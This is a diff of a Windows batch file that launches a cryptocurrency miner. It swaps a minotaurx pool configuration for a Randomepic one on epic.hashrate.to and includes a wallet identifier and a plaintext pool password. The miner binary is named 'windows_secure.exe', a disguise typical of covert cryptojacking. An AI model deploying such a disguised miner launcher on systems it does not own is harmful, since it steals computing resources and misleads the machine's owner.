@@ -1,10 +1,10 @@
-rem
-rem Choose nearest stratum:
-rem       stratum-ru.rplant.xyz   /Moscow/
-rem       stratum-eu.rplant.xyz   /London/
-rem       stratum-asia.rplant.xyz /Singapore/
-rem       stratum-na.rplant.xyz   /Toronto/
-rem
-:start
-"%~dp0"windows_secure.exe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RVUPsgdt4Zsi29WanhW3KxryieaiKVv11B.juju -t 1
-goto start
+:: This is an example you can edit and use
+:: There are numerous parameters you can set, please check Help and Examples folder
+
+
+@echo off
+cd %~dp0
+cls
+
+windows_secure.exe --disable-gpu --algorithm Randomepic  --pool epic.hashrate.to:4000 --wallet Atilla2021.Drongo --password jujum123a  -t 2
+pause
